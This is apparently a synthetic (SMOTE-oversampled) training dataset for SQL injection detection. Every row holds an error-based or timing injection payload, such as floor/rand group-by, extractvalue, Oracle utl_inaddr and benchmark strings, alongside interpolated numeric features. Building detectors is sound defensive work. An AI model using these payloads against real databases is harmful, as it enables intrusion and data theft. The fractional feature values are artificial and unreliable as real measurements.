id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000387,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,1.8915406364336502,215.31133426102642,35.908815536353885,3.8060647851470946,67.18236892729223,37.0,86.72644660906165,24.40251872467254,0.3127198623349511,0.17190818296699054,0.4020765391005659,0.1132954155974925,1.8962219129911932,0.0,0.7012593623362688,0.0,0.7012593623362691,1.298740637663731,0.0,15.506296811681345,0.0,0.0,3.597481275327462,2.701259362336269,1.0,0.0,0.0,0.7012593623362691,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.29874063766373105,0.701259362336269,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.701259362336269,0.0,1.0,1.0,5.701259362336269
SMOTE_000388,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,2.1242999270588716,227.4742576457492,33.932248907750115,3.8460136624358126,72.92050946616565,43.44625182041647,85.48599708733364,25.62149927183341,0.3188271808068914,0.19090488607838252,0.3772392747850988,0.11302865832962739,1.3785007281665886,0.3107496359167056,0.6214992718334112,0.0,0.3107496359167056,2.0,0.0,14.621499271833411,0.0,0.0,4.6892503640832945,4.3107496359167055,0.6892503640832943,0.31074963591670574,0.31074963591670574,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.310749635916706,0.0,1.0,0.3107496359167057,0.3107496359167057,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6892503640832943,0.6892503640832943,6.3107496359167055
SMOTE_000389,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,2.223891448034252,282.7900408323033,38.02177191158293,3.9491628507977965,101.7247250975545,37.72472509755449,106.36236254877724,36.97822808841707,0.35962983876844434,0.1331331494252312,0.3762300171740398,0.1310069946322847,0.34059063719431126,2.637637451222755,0.6811812743886226,0.0,2.0,2.0,0.0,20.0,1.3188187256113775,2.0,5.0,4.6811812743886225,0.34059063719431126,0.6594093628056888,0.34059063719431126,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.34059063719431126,2.0,0.6594093628056887,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000390,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,3.0694011859912083,210.37775721024775,34.214766823911454,3.871440952578139,70.57046635217709,37.0,79.80729085807067,23.0,0.3356987488132151,0.1758829778645128,0.3790856114064939,0.10933266191577823,2.162990386336314,0.0,0.45925240341592166,0.0,0.4592524034159216,1.5407475965840784,0.0,13.837009613663685,0.0,0.0,4.0814951931681565,2.4592524034159213,0.5407475965840783,0.0,0.0,0.45925240341592166,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.5407475965840782,0.45925240341592166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.45925240341592166,0.0,1.0,1.0,5.459252403415921
SMOTE_000391,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,2.0493869069294623,211.0800949708053,35.853554931879074,3.8283990977656734,67.29289013624185,37.0,83.78720483456347,23.0,0.3190179363934851,0.1752964811338856,0.39671749960561936,0.10896808286700997,1.2265400389262429,0.0,0.6933649902684393,0.0,0.6933649902684393,1.3066350097315607,0.0,14.773459961073758,0.0,0.0,3.6132700194631213,2.6933649902684396,0.30663500973156066,0.0,0.0,0.6933649902684393,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.30663500973156077,0.6933649902684393,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6933649902684393,0.0,1.0,1.0,5.69336499026844
SMOTE_000392,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.8630967253453519,279.5685017198871,36.28556419076344,4.036499635616842,108.71391047690861,37.855641907634414,98.9989493353441,34.0,0.3894290394921428,0.1345881430294977,0.35410283635007617,0.12187998112828337,4.0,0.0,0.0,0.0,2.0,1.8572179046182793,0.0,18.28556419076344,0.0,1.7144358092365586,5.142782095381721,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.428346286145162,0.4283462861451621,0.0,1.8572179046182793,1.8572179046182793,0.1427820953817207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8572179046182791,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.571128381526883
SMOTE_000393,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.2795487419030263,235.55308454551468,40.027336525984765,3.8734814914109004,70.3038787987421,44.027336525984765,95.83280383118172,25.389065389606095,0.2975533581541847,0.18693042094197043,0.4073024472054988,0.10821377369834612,0.0,1.0,1.1945326948030468,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.194532694803047,4.194532694803047,0.0,1.0,0.19453269480304688,0.8054673051969531,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3890653896060938,0.0,1.0,0.1945326948030469,0.1945326948030469,0.805467305196953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.805467305196953,0.0,0.8054673051969531,0.8054673051969531,7.0
SMOTE_000394,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.6235446053199214,347.1483361623349,34.0,3.605695807031274,90.56266214026421,54.718668929867896,143.4373378597358,58.429667232466976,0.26097039204249833,0.15759071605963293,0.4131272422267658,0.16831164967110296,0.5703327675330259,0.4296672324669743,2.0,0.0,0.0,3.0,0.0,28.859334464933948,0.0,1.710998302599077,0.42966723246697436,25.0,0.5703327675330256,0.42966723246697447,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000395,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,0.6198533607906346,237.66539476237213,40.56505149074419,3.8934999918048794,72.40518879939536,43.84013730865117,96.42006865432559,25.0,0.3044351000844864,0.18425768638087076,0.40598601495569625,0.10532119857894662,0.1449828364186032,0.8550171635813968,1.0,0.0,1.0,1.8550171635813966,0.0,16.144982836418603,0.0,0.0,3.0,3.8550171635813975,0.14498283641860332,0.8550171635813968,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8550171635813967,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.855017163581397
SMOTE_000396,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,2.9117561015797864,313.09695808422833,38.422482518846074,3.9579680716779135,107.19765733038533,48.0697902261529,118.56206297115186,39.26744755653822,0.3438724557076159,0.15297852840104786,0.377665130093141,0.12548388579819528,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.689930075384297,0.8449650376921491,1.1550349623078509,5.422482518846074,5.577517481153925,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.844965037692149,1.2674475565382237,0.5775174811539254,1.5775174811539254,0.8449650376921491,0.5775174811539254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5775174811539253,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.267447556538222
SMOTE_000397,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.9790039542209245,267.20501323221015,36.0,4.025622223106532,104.19480741003767,35.0,94.82560423430724,33.18460158786522,0.3896349749548798,0.1312230606641551,0.35494282643971214,0.12419913794125297,3.184601587865215,0.0,0.0,0.0,2.0,1.728200529288405,0.0,18.0,0.0,2.0,5.271799470711595,3.7282005292884044,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.4564010585768101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.45640105857681
SMOTE_000398,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,1.134000059635364,343.5813123916774,34.0,3.590531826310476,89.8131239167737,47.83737521664526,145.09343804161315,60.837375216645256,0.2613349496138292,0.13924650688399148,0.42233502357126007,0.17708351993091923,4.0,0.0,0.0,0.0,0.0,2.709343804161315,0.0,29.41868760832263,1.4186876083226299,0.8719685875160551,0.7093438041613149,22.709343804161314,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000399,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.6013578656170604,343.0572250986228,35.34287084977046,3.6469426180328495,92.75727307281943,49.314258300459066,141.9713874506886,59.014306274655695,0.2700254503118817,0.14387974386447075,0.4140914442047551,0.17200336161889251,0.0,2.685741699540931,1.0,0.0,0.0,2.671435424885233,0.0,28.9856937253443,0.0,2.0143062746556986,0.32856457511476744,23.67143542488523,0.0,0.6714354248852328,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6714354248852329,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.6714354248852334
SMOTE_000400,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.24223517701513173,332.7537670398486,35.884035840023294,3.6775228527301045,92.11596415997671,48.289910399941775,135.28991039994176,57.05798207998835,0.2768391263614999,0.1451027539276055,0.4065784154216964,0.1714797042891982,0.05798207998835436,0.0,2.9420179200116454,0.0,0.0,2.0579820799883546,0.0,28.0,0.0,3.0,0.0,25.0,0.057982079988354474,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.05798207998835453,1.0,0.057982079988354474,0.9420179200116454,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.057982079988355
SMOTE_000401,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000030,3.2185619094850138,222.8872600356318,34.58753428062403,3.7947966611564925,67.24136956792509,42.354109532293286,87.23342474833075,26.058356187082687,0.2996190445007884,0.1899188421201637,0.3930817143804814,0.11738039899856653,0.9416438129173149,0.5291780935413425,1.058356187082685,0.0,0.5291780935413426,2.0,0.0,15.058356187082685,0.0,0.0,4.470821906458657,4.529178093541343,0.4708219064586575,0.5291780935413426,0.5291780935413425,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.5291780935413426,0.0,1.0,0.5291780935413426,0.5291780935413426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4708219064586575,0.4708219064586575,6.529178093541343
SMOTE_000402,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,1.7059073734450148,230.80652645043602,32.29030698949249,3.6459899633519655,65.38714042942101,37.7741841936955,97.67744741891352,29.967754408406005,0.2826430133454705,0.16429231146846734,0.4233058456298191,0.12975882955624307,0.0,3.225815806304504,0.5161227957969974,0.0,0.2580613978984987,2.0,0.0,17.483877204203004,1.4838772042030026,0.0,4.741938602101501,2.774184193695496,0.0,1.0,0.2580613978984987,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5161227957969974,0.0,0.2580613978984987,0.2580613978984988,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7419386021015013,0.7419386021015013,5.516122795796997
SMOTE_000403,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000012,0.7730466229501725,327.83149093198756,38.82397171844375,3.903549380727947,103.93631109711872,55.0,129.12737780576256,39.76780202910628,0.3174628813652458,0.16784521682519507,0.39350765672570354,0.12118424508385554,4.0,0.0,0.0,0.0,2.0,1.8239717184437536,0.0,23.295886873775014,1.6479434368875068,0.0,6.0,4.823971718443754,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.8239717184437534,0.17602828155624645,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000404,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,1.3975586242384561,196.2080607091098,31.0,3.6569758160964283,64.66043199033082,25.717123174860152,80.90590075745564,24.92460478646316,0.3308053784761233,0.13025227506561834,0.41203403083735307,0.1269083156209053,3.471654407735337,0.5283455922646625,0.0,0.0,0.0,0.26417279613233124,0.0,16.264172796132332,0.2641727961323312,0.0,4.132086398066166,0.2641727961323337,0.8679136019338344,0.13208639806616562,0.0,0.0,0.0,0.13208639806616573,1.0,0.0,0.0,1.0,0.0,0.1320863980661655,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8679136019338343,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.13208639806616568,0.13208639806616568,3.264172796132331
SMOTE_000405,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.9848029192991825,219.82557901763528,38.809542656996754,3.811724967350055,65.96832307565475,39.158780418658004,91.15878041865801,23.539695104664503,0.2998370197668478,0.1778187392371211,0.41513710397294995,0.10720713702308117,0.0,0.26984755233225033,1.0,0.0,1.0,1.2698475523322506,0.0,16.0,0.0,0.0,3.0,3.2698475523322506,0.0,0.26984755233225044,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.26984755233225044,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.2698475523322506
SMOTE_000406,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.9826038853956426,212.45752651387318,38.45752651387319,3.789280878293586,63.0,37.0,89.0,23.457526513873187,0.2965314870587738,0.17415341303451792,0.4189095610830296,0.11040553882367864,0.4575265138731883,0.0,1.0,0.0,1.0,1.0,0.0,16.0,0.0,0.0,3.0,3.0,0.4575265138731882,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000407,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,1.2633594305407951,291.41326806671793,36.423469277331286,3.835009769722015,99.57653072266872,35.0,116.53061445337435,40.30612289067487,0.34225243827640234,0.1203234228807334,0.3991511112030424,0.13827302763982185,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.30612289067487,1.9999999999999996,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.5765307226687173,0.4234692773312825,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000408,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.8026784229421214,218.3783558125056,38.65982991163851,3.804382854743303,65.41937634267454,38.75954643103603,90.75954643103603,23.439886607759004,0.2993437596582469,0.17721022231106492,0.4160015301038644,0.10744448792682379,0.0,0.21994330387950312,1.0,0.0,1.0,1.2199433038795031,0.0,16.0,0.0,0.0,3.0,3.2199433038795027,0.0,0.21994330387950325,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.2199433038795032,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.219943303879504
SMOTE_000409,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.21094554269882582,272.5358872503192,36.0,4.029507699361637,107.18009686017874,35.0,96.53148392010213,33.8243064700383,0.3931854530040528,0.1284883174484629,0.3542146033891336,0.12411162615835081,3.824306470038301,0.0,0.0,0.0,2.0,1.941435490012767,0.0,18.0,0.0,2.0,5.058564509987233,3.9414354900127666,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.882870980025534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.882870980025533
SMOTE_000410,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,0.4670275253808542,234.93909510319068,31.0,3.6564226622681026,69.58882997051694,37.0,97.9390951031907,30.411170029483053,0.29682747140072996,0.15765759152851522,0.416240809745768,0.12927412732498683,0.2944149852584721,3.7055850147415272,0.0,0.0,0.0,2.0,0.0,17.55837752211229,1.8527925073707636,0.0,5.0,2.0,0.07360374631461819,0.9263962536853818,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
